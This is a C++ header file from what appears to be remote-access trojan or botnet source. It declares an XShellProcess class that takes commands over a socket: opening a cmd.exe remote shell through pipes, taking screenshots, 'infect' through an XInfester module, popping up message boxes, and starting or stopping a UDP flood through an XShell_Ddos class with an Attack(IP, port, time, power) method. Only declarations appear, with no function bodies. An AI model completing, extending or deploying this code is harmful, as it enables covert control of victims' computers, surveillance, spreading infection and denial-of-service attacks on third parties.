#pragma once
#include "../CubeSocket/inc/Cube_AsynIO.h"
#include "../XInfester/inc/XInfester.h"
#include "../CubeSocket/inc/Cube_SocketUDP.h"
#include "Cube_Grammar.h"
#include <stdio.h>


struct XShellProcess_IO
{

};

struct XShellProcess_I
{
	char *Buffer;
	size_t size;
	XShellProcess_I()
	{
		Buffer=NULL;
		size=0;
	}
};

struct XShellProcess_O
{
	char *Buffer;
	size_t size;
	XShellProcess_O()
	{
		Buffer=NULL;
		size=0;
	}
};

class ThreadMessageBox:public Cube_Thread
{
public:
	ThreadMessageBox(){};
	ThreadMessageBox(const char *);
	void Show(const char *message);
	void run() override;
protected:
private:
	char m_MessageBox[1024];
};

#define  XSHELL_DDOS_UDP_PORT 11759

class XShell_Ddos:public Cube_Thread
{
public:
	BOOL initialize();
	void run() override;
	void Attack(char *IP,unsigned int port,unsigned long Timems,unsigned int Power);
	void AttackStop();
private:
	BOOL			m_IsOK;
	Cube_SocketUDP	m_UDP;
	unsigned int	m_Power;
	SOCKADDR_IN     m_TargetAddr;
	unsigned long   m_TimeMs;
};


#define  CMDPROCESS_DEFAULE_RECVSIZE    512

void ScreenCapture(LPSTR filename, WORD BitCount=32, LPRECT lpRect=NULL);


#define  REMOTESHELL_SCMD_MSG			"messagebox"
#define  GRAMMAR_TOKEN_SCMD_MSG			1
	
#define  REMOTESHELL_SCMD_ACTCMD		"cmd.exe"
#define  GRAMMAR_TOKEN_SCMD_ACTCMD		2

#define  REMOTESHELL_SCMD_SCREENSHOT	"screenshot"
#define  GRAMMAR_TOKEN_SCMD_SCREENSHOT	3

#define  REMOTESHELL_SCMD_INFECT	    "infect"
#define  GRAMMAR_TOKEN_SCMD_INFECT  	4

#define  REMOTESHELL_SCMD_DOSATK	    "dosattack"
#define  GRAMMAR_TOKEN_SCMD_DOSATK  	5

#define  REMOTESHELL_SCMD_DOSATKSTOP	"dosstop"
#define  GRAMMAR_TOKEN_SCMD_DOSATKSTOP  6

class XShellProcess:
	public Cube_AsynIO<XShellProcess_IO,XShellProcess_I,XShellProcess_O>
{
public:
	virtual BOOL   Initialize(XShellProcess_IO &info);
	virtual void   Recv(XShellProcess_I &in)						;
	virtual size_t Send(XShellProcess_O &Out)						;
	virtual void   Close();
	virtual void   run();
	
	BOOL		   ActivateCMD();
private:
	bool	ExecuteShellByCore(char *cmd);
	HANDLE m_hReadPipe1,m_hWritePipe1,m_hReadPipe2,m_hWritePipe2;
	DWORD  m_lBytesRead,m_lBytesWrite;
	char   m_RecvBuffer[CMDPROCESS_DEFAULE_RECVSIZE];
	bool   m_bConsoleActivate;
	ThreadMessageBox m_MessageBox;
	XShell_Ddos      m_Ddos;
	CubeGrammar m_Grammar;
	CubeLexer   m_Lexer;

	unsigned int m_Shell_Msg,m_Shell_activateCMD,m_Shell_screenShot,m_Shell_Infect,m_Shell_Dos,m_Shell_DosStop;
};